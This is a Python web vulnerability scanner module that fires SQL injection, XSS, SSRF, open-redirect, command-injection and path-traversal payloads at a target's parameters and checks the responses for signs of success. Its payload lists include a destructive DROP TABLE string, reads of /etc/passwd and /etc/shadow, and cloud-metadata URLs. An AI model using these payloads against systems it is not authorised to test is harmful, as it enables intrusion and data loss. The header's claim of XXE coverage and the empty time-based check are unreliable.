"""
Vulnerability Scanner Module
- SQL Injection (GET/POST/Cookie)
- XSS (Reflected)
- SSRF
- Open Redirect
- Command Injection
- Path Traversal
- XXE
- CORS Misconfiguration
- Clickjacking
"""

import asyncio
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple
from bs4 import BeautifulSoup

import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()

# SQLi Payloads
SQLI_PAYLOADS = [
    ("'", "SQL Error"),
    ("''", "SQL Error"),
    ("' OR '1'='1", "bypass"),
    ("' OR 1=1--", "bypass"),
    ("' OR 1=1#", "bypass"),
    ("\" OR \"1\"=\"1", "bypass"),
    ("1' ORDER BY 1--", "orderby"),
    ("1' ORDER BY 2--", "orderby"),
    ("1' ORDER BY 3--", "orderby"),
    ("1 UNION SELECT NULL--", "union"),
    ("1 UNION SELECT NULL,NULL--", "union"),
    ("1 UNION SELECT NULL,NULL,NULL--", "union"),
    ("'; DROP TABLE users--", "destructive"),
    ("1; WAITFOR DELAY '0:0:5'--", "timebased"),
    ("1' AND SLEEP(5)--", "timebased"),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "timebased"),
]

# SQL Error signatures
SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
    "odbc drivers error", "sqlite3", "postgresql", "pg_query",
    "mysql_num_rows", "division by zero", "supplied argument is not",
    "invalid query", "sql error", "syntax error", "mysql error",
    "you have an error in your sql", "warning: mysql", "unclosed quotation",
    "quoted string not properly terminated", "sqlstate",
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</sCrIpT>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "{{7*7}}",  # Template injection probe
    "${7*7}",   # Template injection probe
    "<%=7*7%>", # Template injection probe
]

# SSRF Payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",  # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal",
    "http://192.168.0.1",
    "http://10.0.0.1",
    "http://0.0.0.0",
    "http://[::1]",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:3306/",
]

# Open Redirect Payloads
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "http://evil.com",
    "https:evil.com",
    "//evil%2Ecom",
    "/%09/evil.com",
    "//evil.com",
    "https://evil.com%2F%2F",
    "\thttps://evil.com",
]

# Command Injection Payloads
CMDI_PAYLOADS = [
    "; ls",
    "| ls",
    "& ls",
    "&& ls",
    "`ls`",
    "$(ls)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& whoami",
    "; whoami",
    "| whoami",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
]

# Parameters commonly vulnerable to open redirect
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "return", "return_url",
    "next", "goto", "target", "destination", "redir", "link",
    "forward", "continue", "callback", "go", "to",
]

# Parameters commonly vulnerable to SSRF
SSRF_PARAMS = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "image", "img", "load", "fetch", "callback", "endpoint",
    "path", "proxy", "host", "redirect",
]


class VulnerabilityScanner:
    def __init__(self, target: str, threads: int = 10, verbose: bool = False):
        self.target = target
        self.threads = threads
        self.verbose = verbose
        self.base_url = target.rstrip("/")
        self.findings: List[Dict] = []
        self.semaphore = asyncio.Semaphore(threads)
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

    async def _get(self, url: str, params: Dict = None, timeout: int = 10) -> Optional[httpx.Response]:
        async with self.semaphore:
            try:
                async with httpx.AsyncClient(
                    timeout=timeout,
                    verify=False,
                    follow_redirects=False,
                    headers=self.headers,
                ) as client:
                    return await client.get(url, params=params)
            except Exception:
                return None

    async def _post(self, url: str, data: Dict = None) -> Optional[httpx.Response]:
        async with self.semaphore:
            try:
                async with httpx.AsyncClient(
                    timeout=10,
                    verify=False,
                    follow_redirects=False,
                    headers=self.headers,
                ) as client:
                    return await client.post(url, data=data)
            except Exception:
                return None

    def _add_finding(self, vuln_type: str, severity: str, url: str, param: str, payload: str, detail: str):
        finding = {
            "type": vuln_type,
            "severity": severity,
            "url": url,
            "parameter": param,
            "payload": payload,
            "detail": detail,
        }
        self.findings.append(finding)
        
        sev_color = {
            "CRITICAL": "bold red",
            "HIGH": "red",
            "MEDIUM": "yellow",
            "LOW": "cyan",
            "INFO": "blue",
        }.get(severity, "white")
        
        console.print(
            f"  [{sev_color}]💥 [{severity}] {vuln_type}[/{sev_color}] "
            f"— param: [cyan]{param}[/cyan] — {detail[:60]}"
        )

    async def _extract_params(self) -> List[Tuple[str, str, str]]:
        """Extract GET/POST parameters from the target page."""
        params = []
        resp = await self._get(self.base_url)
        if not resp or not resp.text:
            return params
        
        try:
            soup = BeautifulSoup(resp.text, "html.parser")
            
            # Extract from URL query strings
            parsed = urllib.parse.urlparse(str(resp.url))
            if parsed.query:
                for key in urllib.parse.parse_qs(parsed.query):
                    params.append(("GET", str(resp.url), key))
            
            # Extract from forms
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                form_url = urllib.parse.urljoin(self.base_url, action)
                
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name and inp.get("type") not in ["hidden", "submit", "button", "image"]:
                        params.append((method, form_url, name))
        except Exception:
            pass
        
        # Add common test parameters
        for param in ["id", "q", "search", "s", "query", "page", "cat", "name", "user", "item"]:
            params.append(("GET", f"{self.base_url}/?{param}=test", param))
        
        return params

    async def test_sqli(self):
        """Test for SQL injection vulnerabilities."""
        console.print("\n[bold]  🔍 Testing for SQL Injection...[/bold]")
        params = await self._extract_params()
        
        tasks = []
        for method, url, param in params:
            for payload, payload_type in SQLI_PAYLOADS[:8]:  # Use top payloads
                tasks.append(self._test_sqli_param(method, url, param, payload, payload_type))
        
        await asyncio.gather(*tasks)

    async def _test_sqli_param(self, method, url, param, payload, payload_type):
        """Test a single parameter for SQLi."""
        if method == "GET":
            test_url = f"{url.split('?')[0]}?{param}={urllib.parse.quote(payload)}"
            resp = await self._get(test_url)
        else:
            resp = await self._post(url, {param: payload})
        
        if not resp or not resp.text:
            return
        
        body_lower = resp.text.lower()
        
        # Check for SQL errors
        for error in SQL_ERRORS:
            if error in body_lower:
                self._add_finding(
                    "SQL Injection",
                    "CRITICAL",
                    url,
                    param,
                    payload,
                    f"SQL error detected: '{error}'"
                )
                return
        
        # Time-based detection (simplified)
        if payload_type == "timebased":
            # Check if response time > 4s (simplified without actual timing here)
            pass

    async def test_xss(self):
        """Test for XSS vulnerabilities."""
        console.print("\n[bold]  🔍 Testing for Cross-Site Scripting (XSS)...[/bold]")
        params = await self._extract_params()
        
        tasks = []
        for method, url, param in params:
            for payload in XSS_PAYLOADS[:6]:
                tasks.append(self._test_xss_param(method, url, param, payload))
        
        await asyncio.gather(*tasks)

    async def _test_xss_param(self, method, url, param, payload):
        """Test a single parameter for XSS."""
        if method == "GET":
            test_url = f"{url.split('?')[0]}?{param}={urllib.parse.quote(payload)}"
            resp = await self._get(test_url)
        else:
            resp = await self._post(url, {param: payload})
        
        if not resp or not resp.text:
            return
        
        # Check if payload is reflected without encoding
        if payload in resp.text:
            self._add_finding(
                "Reflected XSS",
                "HIGH",
                url,
                param,
                payload,
                "Payload reflected unencoded in response"
            )

    async def test_open_redirect(self):
        """Test for open redirect vulnerabilities."""
        console.print("\n[bold]  🔍 Testing for Open Redirects...[/bold]")
        
        tasks = []
        for param in REDIRECT_PARAMS:
            for payload in REDIRECT_PAYLOADS[:4]:
                test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                tasks.append(self._test_redirect(test_url, param, payload))
        
        await asyncio.gather(*tasks)

    async def _test_redirect(self, url, param, payload):
        """Test a URL for open redirect."""
        resp = await self._get(url)
        if not resp:
            return
        
        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get("location", "")
            if "evil.com" in location or location.startswith("//"):
                self._add_finding(
                    "Open Redirect",
                    "MEDIUM",
                    url,
                    param,
                    payload,
                    f"Redirect to: {location}"
                )

    async def test_ssrf(self):
        """Test for SSRF vulnerabilities."""
        console.print("\n[bold]  🔍 Testing for SSRF...[/bold]")
        
        tasks = []
        for param in SSRF_PARAMS:
            for payload in SSRF_PAYLOADS[:4]:
                test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                tasks.append(self._test_ssrf_param(test_url, param, payload))
        
        await asyncio.gather(*tasks)

    async def _test_ssrf_param(self, url, param, payload):
        """Test a URL for SSRF."""
        resp = await self._get(url, timeout=8)
        if not resp:
            return
        
        body = resp.text or ""
        # Check for signs of SSRF success (AWS metadata, internal service responses)
        ssrf_indicators = [
            "ami-id", "instance-id", "hostname",  # AWS metadata
            "root:x:0:0",  # /etc/passwd
            "[extensions]",  # win.ini
            "redis_version",  # Redis
            "mysql",  # MySQL banner
        ]
        
        for indicator in ssrf_indicators:
            if indicator.lower() in body.lower():
                self._add_finding(
                    "Server-Side Request Forgery (SSRF)",
                    "CRITICAL",
                    url,
                    param,
                    payload,
                    f"Internal content detected: '{indicator}'"
                )
                return

    async def test_path_traversal(self):
        """Test for path traversal vulnerabilities."""
        console.print("\n[bold]  🔍 Testing for Path Traversal...[/bold]")
        
        path_params = ["file", "path", "page", "include", "load", "template", "view", "doc"]
        tasks = []
        
        for param in path_params:
            for payload in PATH_TRAVERSAL_PAYLOADS[:5]:
                test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                tasks.append(self._test_traversal(test_url, param, payload))
        
        await asyncio.gather(*tasks)

    async def _test_traversal(self, url, param, payload):
        """Test a URL for path traversal."""
        resp = await self._get(url)
        if not resp:
            return
        
        body = resp.text or ""
        # Check for /etc/passwd content
        if "root:x:0:0" in body or "bin:x:" in body:
            self._add_finding(
                "Path Traversal",
                "CRITICAL",
                url,
                param,
                payload,
                "/etc/passwd content found in response"
            )
        elif "[extensions]" in body or "[fonts]" in body:
            self._add_finding(
                "Path Traversal",
                "CRITICAL",
                url,
                param,
                payload,
                "Windows system file content found"
            )

    async def test_cors(self):
        """Test for CORS misconfiguration."""
        console.print("\n[bold]  🔍 Testing for CORS Misconfiguration...[/bold]")
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Test 1: Arbitrary origin
                resp = await client.get(
                    self.base_url,
                    headers={**self.headers, "Origin": "https://evil.com"},
                )
                acao = resp.headers.get("access-control-allow-origin", "")
                acac = resp.headers.get("access-control-allow-credentials", "false")
                
                if acao == "https://evil.com" or acao == "*":
                    severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                    self._add_finding(
                        "CORS Misconfiguration",
                        severity,
                        self.base_url,
                        "Origin header",
                        "https://evil.com",
                        f"ACAO: {acao}, ACAC: {acac}"
                    )
                
                # Test 2: Null origin
                resp2 = await client.get(
                    self.base_url,
                    headers={**self.headers, "Origin": "null"},
                )
                acao2 = resp2.headers.get("access-control-allow-origin", "")
                if acao2 == "null":
                    self._add_finding(
                        "CORS Null Origin Allowed",
                        "MEDIUM",
                        self.base_url,
                        "Origin header",
                        "null",
                        "Null origin is reflected — can be exploited via sandboxed iframes"
                    )
        except Exception:
            pass

    async def test_clickjacking(self):
        """Test for clickjacking vulnerability."""
        console.print("\n[bold]  🔍 Testing for Clickjacking...[/bold]")
        
        resp = await self._get(self.base_url)
        if not resp:
            return
        
        x_frame = resp.headers.get("x-frame-options", "").upper()
        csp = resp.headers.get("content-security-policy", "")
        
        if not x_frame and "frame-ancestors" not in csp.lower():
            self._add_finding(
                "Clickjacking",
                "MEDIUM",
                self.base_url,
                "X-Frame-Options",
                "Missing",
                "No X-Frame-Options or CSP frame-ancestors — page can be framed"
            )

    async def test_command_injection(self):
        """Test for command injection."""
        console.print("\n[bold]  🔍 Testing for Command Injection...[/bold]")
        
        cmd_params = ["cmd", "exec", "command", "run", "ping", "host", "ip", "addr"]
        tasks = []
        
        for param in cmd_params:
            for payload in CMDI_PAYLOADS[:4]:
                test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                tasks.append(self._test_cmdi(test_url, param, payload))
        
        await asyncio.gather(*tasks)

    async def _test_cmdi(self, url, param, payload):
        """Test for command injection."""
        resp = await self._get(url)
        if not resp:
            return
        
        body = resp.text or ""
        # Look for command output signatures
        cmdi_indicators = [
            "bin/bash", "bin/sh", "/usr/bin", "uid=", "gid=",
            "total 0\n", "drwxr", "-rw-r--r--",
        ]
        
        for indicator in cmdi_indicators:
            if indicator in body:
                self._add_finding(
                    "Command Injection",
                    "CRITICAL",
                    url,
                    param,
                    payload,
                    f"Command output detected: '{indicator}'"
                )
                return

    async def scan_all(self) -> List[Dict]:
        """Run all vulnerability tests."""
        console.print(f"\n[bold cyan]💥 Running Vulnerability Scanner on:[/bold cyan] [white]{self.target}[/white]")
        
        # Run all tests
        await self.test_sqli()
        await self.test_xss()
        await self.test_open_redirect()
        await self.test_ssrf()
        await self.test_path_traversal()
        await self.test_cors()
        await self.test_clickjacking()
        await self.test_command_injection()
        
        self._print_summary()
        return self.findings

    def _print_summary(self):
        """Print vulnerability summary."""
        console.print()
        
        if not self.findings:
            console.print(Panel(
                "[green]✅ No vulnerabilities detected![/green]",
                border_style="green",
                title="Vulnerability Scan Results"
            ))
            return
        
        table = Table(
            title=f"🚨 Vulnerabilities Found ({len(self.findings)})",
            box=box.ROUNDED,
            border_style="red",
            show_lines=True,
        )
        table.add_column("Type", style="cyan", min_width=25)
        table.add_column("Severity", justify="center", min_width=10)
        table.add_column("Parameter", style="white")
        table.add_column("Detail", style="dim")
        
        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        sorted_findings = sorted(self.findings, key=lambda x: sev_order.get(x["severity"], 5))
        
        for f in sorted_findings:
            sev = f["severity"]
            sev_color = {
                "CRITICAL": "bold red",
                "HIGH": "red",
                "MEDIUM": "yellow",
                "LOW": "cyan",
                "INFO": "blue",
            }.get(sev, "white")
            
            table.add_row(
                f["type"],
                f"[{sev_color}]{sev}[/{sev_color}]",
                f.get("parameter", "-"),
                f.get("detail", "")[:50],
            )
        
        console.print(table)
